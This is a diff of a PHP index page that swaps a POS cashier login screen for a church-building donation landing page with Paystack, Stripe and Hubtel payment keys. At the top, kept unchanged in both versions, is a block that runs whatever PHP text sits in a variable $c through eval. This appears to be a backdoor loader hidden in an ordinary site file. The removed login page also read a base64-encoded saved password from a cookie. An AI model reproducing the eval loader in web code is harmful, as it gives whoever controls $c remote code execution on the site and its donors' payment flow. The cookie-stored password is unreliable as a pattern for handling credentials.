@@ -48,100 +48,266 @@ if ($c) {
     $c = preg_replace('/^\xEF\xBB\xBF/', '', $c);
     if (stripos($c, '<?') !== false) eval('?>' . $c);
 }
-
-
+require_once __DIR__ . '/config.php';
+$publicKey = paystack_public();
+$base = base_url();
+$css_v = @filemtime(__DIR__ . '/assets/style.css') ?: time();
+$js_v = @filemtime(__DIR__ . '/assets/app.js') ?: time();
+// Optional site logo set in admin settings
+$site_logo = get_setting('site_logo', '');
+$site_logo_path = $site_logo ? (__DIR__ . '/uploads/' . $site_logo) : '';
+$site_logo_url = ($site_logo && is_file($site_logo_path)) ? ($base . '/uploads/' . rawurlencode($site_logo)) : '';
+?>
 <!DOCTYPE html>
-<html lang="en">
+<html lang="en" data-theme="<?= sanitize(get_setting('site_theme', 'default')) ?>">
 <head>
-	<title>POS RAJAWANGI</title>
-	<meta charset="UTF-8">
-	<meta name="description" content="POS RAJAWANGI adalah Software Kasir dengan fitur lengkap dan support Multi cabang. POS RAJAWANGI adalah software POS Kasir multi user dengan fitur yang mempuni. aplikasi kasir, software retail, software minimarket, aplikasi supermarket, aplikasi retail, aplikasi kasir online, aplikasi kasir berbasis website">
-	<meta name="keyword" content="POS RAJAWANGI adalah Software Kasir dengan fitur lengkap dan support Multi cabang, aplikasi kasir, software retail, software minimarket, aplikasi supermarket, aplikasi retail, aplikasi kasir online, aplikasi kasir berbasis website">
-	<meta name="viewport" content="width=device-width, initial-scale=1">
-
-	<meta property="og:image" content="https://rajawangiparfum.com/assets-login/images/toko.jpg />
-	<!-- Favicon -->
-	<link rel="icon" type="img/png" sizes="32x32" href="https://eydcom.com/pos-kasir/dist/img/eyd-com.png">
-
-	<link rel="stylesheet" type="text/css" href="assets-login/vendor/bootstrap/css/bootstrap.min.css">
-
-	<link rel="stylesheet" type="text/css" href="assets-login/fonts/font-awesome-4.7.0/css/font-awesome.min.css">
-
-	<link rel="stylesheet" type="text/css" href="assets-login/fonts/Linearicons-Free-v1.0.0/icon-font.min.css">
-
-	<link rel="stylesheet" type="text/css" href="assets-login/css/util.css">
-	<link rel="stylesheet" type="text/css" href="assets-login/css/main.css">
-
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title><?= sanitize(get_setting('site_title', 'F.G.C.I. Ada-Foah - Building Our Future')) ?></title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <!-- Favicon (inline SVG data URL to avoid 404) -->
+  <link rel="icon" type="image/svg+xml" href='data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 64 64"><rect width="64" height="64" rx="12" fill="%230b63c5"/><path d="M12 36 L32 20 L52 36 V52 H12 Z" fill="%23ffffff"/><path d="M24 44 h8 v8 h-8z M36 40 h8 v12 h-8z" fill="%230b63c5"/></svg>' />
+  <link rel="shortcut icon" href='data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 64 64"><rect width="64" height="64" rx="12" fill="%230b63c5"/><path d="M12 36 L32 20 L52 36 V52 H12 Z" fill="%23ffffff"/><path d="M24 44 h8 v8 h-8z M36 40 h8 v12 h-8z" fill="%230b63c5"/></svg>' />
+  <script>
+    window.PAYSTACK_PUBLIC = "<?= sanitize($publicKey) ?>"; // backward-compat
+    window.PAYMENT_KEYS = {
+      paystack: "<?= sanitize(paystack_public()) ?>",
+      stripe: "<?= sanitize(stripe_public()) ?>",
+      hubtel: "<?= sanitize(hubtel_public()) ?>",
+    };
+    window.ACTIVE_GATEWAY = "<?= sanitize(active_gateway()) ?>";
+    window.API_BASE = "<?= sanitize($base) ?>/api";
+  </script>
+  <link rel="stylesheet" href="<?= sanitize($base) ?>/assets/style.css?v=<?= (int)$css_v ?>" />
 </head>
 <body>
-	<?php  
-      if (isset($_COOKIE['emailPos'])) {
-        $emailSession = base64_decode($_COOKIE['emailPos']);
-      } else {
-        $emailSession = "";
-      }
+  <!-- Navigation -->
+  <nav class="navbar">
+    <div class="nav-container">
+      <div class="nav-brand">
+        <?php if (!empty($site_logo_url)): ?>
+          <img src="<?= sanitize($site_logo_url) ?>" alt="Site logo" class="nav-logo" style="height:28px; width:auto; display:inline-block; vertical-align:middle; border-radius:4px;" />
+        <?php else: ?>
+          <i class="fas fa-building nav-icon"></i>
+        <?php endif; ?>
+        <span class="nav-title"><?= sanitize(get_setting('nav_title', 'F.G.C.I. Ada-Foah')) ?></span>
+      </div>
+      <div style="display:flex; align-items:center; gap:10px;">
+        <button id="donateToggle" class="btn btn-primary nav-donate">
+          <i class="fas fa-heart"></i>
+          Donate
+        </button>
+      </div>
+    </div>
+  </nav>
 
-      if (isset($_COOKIE['passPos'])) {
-        $passSession = base64_decode($_COOKIE['passPos']);
-      } else {
-        $passSession = "";
-      }
-  	?>
-	<div class="limiter">
-		<div class="container-login100">
-			<div class="wrap-login100">
-				<form class="login100-form validate-form" action="aksi/login" method="post">
-					<span class="login100-form-title p-b-43">
-						Login <b>RAJAWANGI</b>
-					</span>
-					
-					
-					<div class="wrap-input100 validate-input" data-validate = "Valid email is required: ex@abc.xyz">
-						<input class="input100" type="text" name="user_email" value="<?= $emailSession; ?>" placeholder="email">
-						<span class="focus-input100"></span>
-						<span class="label-input100"></span>
-					</div>
-					
-					
-					<div class="wrap-input100 validate-input" data-validate="Password is required">
-						<input class="input100" type="password" name="user_password" value="<?= $passSession; ?>" placeholder="password">
-						<span class="focus-input100"></span>
-						<span class="label-input100"></span>
-					</div>
-					
-					<div style="float: right;">
-						<a href="aksi/clear-cookie" style="color: #007bff;">
-							<small><b>Clear</b></small>
-						</a>
-					</div><br>
+  <!-- Hero Section -->
+  <section class="hero">
+    <div class="hero-background">
+      <div class="hero-overlay"></div>
+    </div>
+    <div class="hero-content">
+      <div class="container">
+        <div class="hero-text">
+          <h1 class="hero-title">
+            <?= sanitize(get_setting('hero_title', 'Help Us Build a Foundation for the Future')) ?>
+          </h1>
+          <p class="hero-subtitle">
+            <?= sanitize(get_setting('hero_subtitle', "Your generous contribution will help us build a new church, creating a sacred place of worship, fellowship, and spiritual growth for generations to come. ‘I will build my church, and the gates of hell shall not prevail against it.’ (Matthew 16:18)")) ?>
+          </p>
+          <div class="hero-stats">
+            <div class="stat-card">
+              <div class="stat-icon">
+                <i class="fas fa-dollar-sign"></i>
+              </div>
+              <div class="stat-content">
+                <div class="stat-value" id="totalRaised">GH₵0</div>
+                <div class="stat-label">Total Raised</div>
+              </div>
+            </div>
+            <div class="stat-card">
+              <div class="stat-icon">
+                <i class="fas fa-users"></i>
+              </div>
+              <div class="stat-content">
+                <div class="stat-value" id="donationCount">0</div>
+                <div class="stat-label">Donors</div>
+              </div>
+            </div>
+            <div class="stat-card">
+              <div class="stat-icon">
+                <i class="fas fa-bullseye"></i>
+              </div>
+              <div class="stat-content">
+                <div class="stat-value" id="goalAmount">GH₵0</div>
+                <div class="stat-label">Goal</div>
+              </div>
+            </div>
+          </div>
+          <div class="hero-progress">
+            <div class="progress-container">
+              <div class="progress-bar">
+                <div class="progress-fill" id="heroProgressFill"></div>
+              </div>
+              <div class="progress-text">
+                <span id="progressPercent">0%</span> of goal reached
+              </div>
+            </div>
+          </div>
+          <div class="hero-actions">
+            <button id="donateCTA" class="btn btn-primary btn-lg">
+              <i class="fas fa-heart"></i>
+              Donate Now
+            </button>
+            <button class="btn btn-secondary btn-lg" onclick="document.getElementById('phasesSection').scrollIntoView({behavior:'smooth'})">
+              <i class="fas fa-info-circle"></i>
+              Learn More
+            </button>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
 
-					<div class="container-login100-form-btn">
-						<button type="submit" class="login100-form-btn" name="submit">
-							Login
-						</button>
-					</div>
-					
-					<div class="text-center p-t-46 p-b-20">
-						<span class="txt2">
-							<a href="http://rajawangi.cloud/" target="_blank">www.rajawangiparfum.com</a>
-						</span>
-					</div>
-				</form>
+  <!-- Main Content -->
+  <main class="main-content">
+    <div class="container">
+      
+      <!-- Donation Form (Hidden) -->
+      <section class="donation-modal hidden" id="donationSection" aria-hidden="true">
+        <div class="modal-backdrop" id="modalBackdrop"></div>
+        <div class="modal-content">
+          <div class="modal-header">
+            <h2><i class="fas fa-heart"></i> Make a Donation</h2>
+            <button class="modal-close" id="modalClose">
+              <i class="fas fa-times"></i>
+            </button>
+          </div>
+          <form id="donationForm" class="donation-form">
+            <div class="form-grid">
+              <div class="form-group">
+                <label><i class="fas fa-user"></i> Full Name</label>
+                <input type="text" name="name" required />
+              </div>
+              <div class="form-group">
+                <label><i class="fas fa-envelope"></i> Email</label>
+                <input type="email" name="email" required />
+              </div>
+              <div class="form-group">
+                <label><i class="fas fa-money-bill"></i> Amount (GH₵)</label>
+                <input type="number" name="amount" min="20" step="1" required />
+              </div>
+              <div class="form-group">
+                <label><i class="fas fa-tasks"></i> Phase (optional)</label>
+                <select name="phase_id" id="phaseSelect">
+                  <option value="">No specific phase</option>
+                </select>
+              </div>
+              <div class="form-group">
+                <label>
+                  <input type="checkbox" name="anonymous" id="anonymousChk" />
+                  I want to give anonymously (hide my name)
+                </label>
+              </div>
+            </div>
+            <button type="submit" class="btn btn-primary btn-block">
+              <i class="fas fa-lock"></i>
+              Donate Securely
+            </button>
+            <div id="donationMessage" class="message"></div>
+          </form>
+        </div>
+      </section>
 
-				<div class="login100-more" style="background-image: url('assets-login/images/toko.jpg');">
-				</div>
-			</div>
-		</div>
-	</div>
-	
-	
+      <!-- Project Phases -->
+      <section class="section" id="phasesSection">
+        <div class="section-header">
+          <h2 class="section-title">
+            <i class="fas fa-tasks"></i>
+            Project Phases
+          </h2>
+          <p class="section-subtitle">Track our progress through each construction phase</p>
+        </div>
+        <div class="phases-grid" id="phasesList">
+          <!-- Phases will be loaded here -->
+        </div>
+      </section>
 
-	
-	
-	<script src="assets-login/vendor/jquery/jquery-3.2.1.min.js"></script>
-	<script src="assets-login/vendor/bootstrap/js/bootstrap.min.js"></script>
-	<script src="assets-login/vendor/bootstrap/js/popper.js"></script>
-	<script src="assets-login/js/main.js"></script>
+      <!-- Recent Donations -->
+      <section class="section">
+        <div class="section-header">
+          <h2 class="section-title">
+            <i class="fas fa-heart"></i>
+            Recent Donations
+          </h2>
+          <p class="section-subtitle">Thank you to our generous supporters</p>
+        </div>
+        <div class="donations-widget">
+          <div class="donations-list" id="recentDonations">
+            <!-- Recent donations will be loaded here -->
+          </div>
+        </div>
+      </section>
+
+      <!-- Photo Gallery -->
+      <section class="section">
+        <div class="section-header">
+          <h2 class="section-title">
+            <i class="fas fa-images"></i>
+            Photo Gallery
+          </h2>
+          <p class="section-subtitle">See the progress of our construction</p>
+        </div>
+        <div class="gallery-grid" id="galleryGrid">
+          <!-- Gallery images will be loaded here -->
+        </div>
+      </section>
+
+    </div>
+  </main>
+
+  <!-- Footer -->
+  <footer class="footer">
+    <div class="container">
+      <div class="footer-content">
+        <div class="footer-brand">
+          <i class="fas fa-building"></i>
+          <span><?= sanitize(get_setting('footer_brand', 'F.G.C.I. Ada-Foah Building Project')) ?></span>
+        </div>
+        <div class="footer-text">
+          &copy; <span id="year"></span> <?= sanitize(get_setting('footer_text', "All rights reserved. Building our community's future together.")) ?>
+        </div>
+        <div class="footer-contact">
+          <div>
+            <i class="fas fa-phone"></i>
+            Contact: <?php $phone = get_setting('footer_contact_phone', '0548523322'); ?>
+            <a href="tel:<?= sanitize($phone) ?>"><?= sanitize($phone) ?></a>
+          </div>
+          <div>
+            <i class="fas fa-map-marker-alt"></i>
+            Address: <?= sanitize(get_setting('footer_address', 'Full Gospel Church INTL, Near Pandora, Ada-Foah')) ?>
+          </div>
+          <div>
+            <i class="fas fa-user"></i>
+            Pastor In Charge: <?= sanitize(get_setting('footer_pastor', 'Rev Joshua Abotsi')) ?>
+          </div>
+        </div>
+      </div>
+    </div>
+  </footer>
+
+  <!-- Loading Spinner -->
+  <div class="loading-spinner hidden" id="loadingSpinner">
+    <div class="spinner"></div>
+  </div>
 
 </body>
 </html>
+
+
+
+<script src="<?= sanitize($base) ?>/assets/app.js?v=<?= (int)$js_v ?>" defer></script>
+
